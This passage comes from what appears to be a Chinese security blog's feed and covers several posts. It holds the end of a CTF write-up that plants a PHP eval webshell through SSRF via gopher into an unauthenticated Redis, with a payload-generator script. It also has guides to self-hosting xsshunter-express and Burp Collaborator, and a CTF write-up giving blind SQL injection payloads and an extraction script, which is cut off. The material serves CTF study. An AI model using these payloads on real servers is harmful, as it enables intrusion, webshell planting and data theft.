class="line">gopher://127.0.0.1:6379/_%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25245%250D%250A1.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure><p>成功。</p><p><img src="/2024/07/25/CTF%E5%88%B7%E9%A2%98%E7%AF%872/2.png"></p><h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><h4 id="使用到了gopher协议"><a href="#使用到了gopher协议" class="headerlink" title="使用到了gopher协议"></a>使用到了gopher协议</h4><blockquote><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，当然现在 Gopher 协议已经慢慢淡出历史。<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。</p></blockquote><p>特定的协议开头，“_”后面跟着内容部分。</p><p><code>gopher://127.0.0.1:6379/_</code></p><h4 id="Redis的语法"><a href="#Redis的语法" class="headerlink" title="Redis的语法"></a>Redis的语法</h4><p>上述使用的Payload是基于存在Redis未授权漏洞的情况下，无需密码，下面我们来简单分析一下使用的payload。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1</span></span><br><span class="line">1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">dir</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">13</span></span><br><span class="line">/var/www/html</span><br><span class="line">*4</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">10</span></span><br><span class="line">dbfilename</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">5</span></span><br><span class="line">1.php</span><br><span class="line">*1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><code>*3</code>指的是三个变量，<code>$3</code>指的是字符的长度为3。</p><p>正常我们使用Redis的语法，首先需要进行登录，存在未授权可直接登录，不存在则需要密码登录。</p><p><code>redis-cli -h 192.168.73.150 -a password</code></p><p>上传Webshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &lt;?php$&#123;IFS&#125;eval($_POST[1]);?&gt;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename 1.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>注意</strong></em>：我注意到很多打CTF的同学使用的<code>Gopherus</code>去生成的payload，我发现<code>Gopherus</code>在生成payload时，使用到了<code>flushall</code>命令，该命令用于清空 Redis 服务器中的所有数据库，数据会被永久删除，切记不可用于实际环境中！</p></blockquote><p>网上翻到的脚本，实测可行，SSRF打Redis的redis_shell.py如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"><span class="comment">#shell</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_POST[1]);?&gt;\n\n&quot;</span></span><br><span class="line"><span class="comment">#文件名</span></span><br><span class="line">filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"><span class="comment">#redis密码</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[</span><br><span class="line">    <span class="comment">#&quot;auth passwd&quot;,</span></span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += quote(redis_format(x))</span><br><span class="line">    <span class="comment">#最后的结果要对&quot;_&quot;后面进行一次url编码</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>在使用SSRF打Redis时，对于”gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_”后的内容需要进行一次url编码。</p><h2 id="SSRF打无密码mysql"><a href="#SSRF打无密码mysql" class="headerlink" title="SSRF打无密码mysql"></a>SSRF打无密码mysql</h2><h2 id="SSRF的绕过"><a href="#SSRF的绕过" class="headerlink" title="SSRF的绕过"></a>SSRF的绕过</h2><p>学习SSRF不能仅仅局限于CTF比赛中，更多的是要运用在实际的环境中。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Redis </tag>
            
            <tag> gopher协议 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xsshunter-express搭建</title>
      <link href="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://www.youtube.com/watch?v=HF05dr8xhso&t=377s">https://www.youtube.com/watch?v=HF05dr8xhso&amp;t=377s</a></p><h4 id="域名配置"><a href="#域名配置" class="headerlink" title="域名配置"></a>域名配置</h4><p>首先配置一下自己的域名，以test.com域名为例，将xsshunter-express配置到域名xss.test.com上。</p><p><em><strong>注意：</strong></em>我的服务器为腾讯云的香港服务器无需备案可访问。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/1.png"></p><h4 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h4><p>首先下载xsshunter-express</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mandatoryprogrammer/xsshunter-express.git</span><br><span class="line">cd xsshunter-express/</span><br></pre></td></tr></table></figure><p>安装使用的是docker环境，修改docker的配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure><p>修改配置，将version修改为3.3，将HOSTNAME修改为你的域名xss.test.com。如果只是想让xsshunter-express可以使用，这样就行了，需要登陆xss.test.com看一下xss是否触发。还可以配置邮箱接收自己的xss触发提醒，这里我为了方便没有配置，想配置可以参考原视频。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/2.png"></p><p>开始安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d postgresdb</span><br><span class="line">docker-compose up xsshunterexpress</span><br></pre></td></tr></table></figure><p>安装成功，记一下密码。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/3.png"></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>访问<a href="https://xss.test.com/admin/#/%EF%BC%8C%E8%BE%93%E5%85%A5%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A0%81%E5%8D%B3%E5%8F%AF%E7%99%BB%E5%BD%95%E3%80%82">https://xss.test.com/admin/#/，输入你的密码即可登录。</a></p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/4.png"></p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/5.png"></p><p>在XSS PAYLOADS模块，随意找一个payload进行测试，我是用的<code>&lt;img&gt;</code>的测试标签。</p><p><img src="/2024/07/22/xsshunter-express%E6%90%AD%E5%BB%BA/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建Burp Collaborator</title>
      <link href="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/"/>
      <url>/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://hackplaza.net/2021/12/17/how-to-setup-private-burp-collaborator/">https://hackplaza.net/2021/12/17/how-to-setup-private-burp-collaborator/</a></p><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><p>Docker、域名、BurpSuite、服务器Ubuntu 20（尽量选择香港服务器，域名不需要备案可访问）</p><h4 id="设置域名"><a href="#设置域名" class="headerlink" title="设置域名"></a>设置域名</h4><p>去到自己的域名的DNS管理器。设置一个burp collaborator子域名，并将NS记录添加到你的burp collaborator子域名，一个A记录指向你的服务器，如下图所示。</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/1.png"></p><p>NS记录的域名为你使用的BurpSuite Collaborator域名。</p><h4 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h4><p>如果没有docker需要安装docker。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y </span><br><span class="line"><span class="built_in">sudo</span> apt install docker.io</span><br></pre></td></tr></table></figure><p>安装docker以后，继续</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/integrity-sa/burpcollaborator-docker.git &amp;&amp; cd burpcollaborator-docker</span><br></pre></td></tr></table></figure><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/2.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">&quot;https://portswigger.net/burp/releases/download?product=pro&amp;version=2021.10.3&amp;type=Jar&quot;</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;download?product=pro&amp;version=2021.10.3&amp;type=Jar&#x27;</span> burp.jar &amp;&amp; <span class="built_in">mv</span> burp.jar ./burp/pkg/burp.jar</span><br></pre></td></tr></table></figure><p>确保将域名和IP替换为响应的域名和服务器IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./init.sh burp.hackplaza.net 20.119.42.229</span><br></pre></td></tr></table></figure><p>如果你遇到这样的错误。</p><p>Error starting userland proxy: listen tcp4 0.0.0.0:53: bind: address already in use.</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/3.png"></p><p>使用下面的命令解决。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl stop systemd-resolved</span><br></pre></td></tr></table></figure><h4 id="入站规则"><a href="#入站规则" class="headerlink" title="入站规则"></a>入站规则</h4><p>如果你再次遇到这样的错误。</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/4.png"></p><p>你必须在网络组中进行一些更改才能允许入站链接。你必须相应地在VPS提供商中执行此操作。我正在使用Azure，所以这是如何做到的。</p><p>Click on VM &gt; Networking &gt; Add inbound port rule &gt; In Destination Port ranges keep * in it and finally click on Add</p><p>单击“VM”&gt;“网络&gt;”添加入站端口规则“&gt;”在目标端口范围中保留 *“，最后单击”添加”</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/5.png"></p><p>再次运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./init.sh burp.hackplaza.net 20.119.42.229</span><br></pre></td></tr></table></figure><p>将域名和服务器IP替换为你自己的IP。</p><p>成功完整的安装输出将如下所示：</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/6.png"></p><h4 id="使用BurpSuite-Pro进行测试"><a href="#使用BurpSuite-Pro进行测试" class="headerlink" title="使用BurpSuite Pro进行测试"></a>使用BurpSuite Pro进行测试</h4><p>打开您的 Burp Suite Professional</p><p>Click on Project Options Tab &gt; Misc &gt; Burp Collaborator Server<br>单击“项目选项”选项卡 &gt; “杂项”&gt; Burp Collaborator Server</p><p>Select use private collaborator and do like shown in picture and click on Run Health check</p><p>选择使用private collaborator，并如图所示，然后单击运行运行状况检查</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/7.png"></p><p>现在，您可以从BurpSuite Pro正常使用您的private Burp Collaborator服务器。</p><p>上述为原文的翻译部分，下面为自己安装时遇到的问题。</p><h4 id="配置问题"><a href="#配置问题" class="headerlink" title="配置问题"></a>配置问题</h4><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/8.png"></p><h4 id="证书问题"><a href="#证书问题" class="headerlink" title="证书问题"></a>证书问题</h4><p>certbot默认生成证书使用的是EC算法，处理证书使用的是处理RSA证书的代码，所以需要修改证书为RSA证书。</p><p>&#x2F;burpcollaborator-docker&#x2F;certbot&#x2F;new.sh</p><p>这个是生成证书的文件，在末尾加上<code>--key-type rsa</code>即可。</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/9.png"></p><p>Burpsuite Collaborator配置</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/10.png"></p><h4 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h4><p><code>docker logs burp</code>查看burp报错的原因，找问题所在。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
            <tag> dnslog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF刷题篇1</title>
      <link href="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/"/>
      <url>/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/</url>
      
        <content type="html"><![CDATA[<h3 id="NewStarCTF-2023-web-week3-midsql-sql"><a href="#NewStarCTF-2023-web-week3-midsql-sql" class="headerlink" title="[NewStarCTF 2023] web week3 midsql_sql"></a>[NewStarCTF 2023] web week3 midsql_sql</h3><p>通过布尔判断存在sql注入。</p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/sql_1.png"></p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/sql_2.png"></p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/sql_3.png"></p><p>数据库名为：<code>ctf</code>，<code>left(&#39;abcde&#39;,3)=&#39;abc&#39;</code>从字符串的左边开始截取3个字符。</p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/sql_4.png"></p><p>经过测试发现，无法进行union注入，select等敏感函数被过滤，可通过大小写绕过。</p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/no_union.png"></p><p>关键函数<code>group_concat(table_name)</code>，将分组中的值连接组合，即这里将表名连接组合。通过此函数得到表名、列名。</p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/sql_5.png"></p><p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/sql_6.png"></p><p>利用到的payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &amp;&amp; 1-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="number">0</span><span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27; &amp;&amp; if((length(database())=3),1,0)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="keyword">left</span>(database(),<span class="number">3</span>)<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span><span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27; &amp;&amp; if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema=&#x27;</span>ctf<span class="string">&#x27;),1,1))=t,1,0)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> if(Ascii(Substr((<span class="keyword">Select</span> Group_concat(column_name) <span class="keyword">From</span> infOrmation_schema.columns <span class="keyword">Where</span> Table_name<span class="operator">=</span><span class="string">&#x27;here_is_flag&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span>t,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>通过上述的获取表名和列名的sql语句，通过字符的<strong>ASCII</strong>和<strong>t</strong>比较大小，可以利用二分法快速输出数据库名、表名、列名等信息。</p><p>个人感觉比较好用的poc如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;http://8bbb955c-7d10-474e-8234-4da0fb1ae4d9.node5.buuoj.cn:81/?id=TMP0919&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DBname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--库名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#根据数据包的特征判断</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据库名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TBname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--表名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema=&#x27;ctf&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据表名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CLname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--列名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(column_name) From infOrmation_schema.columns Where Table_name=&#x27;here_is_flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据列名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Valname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span 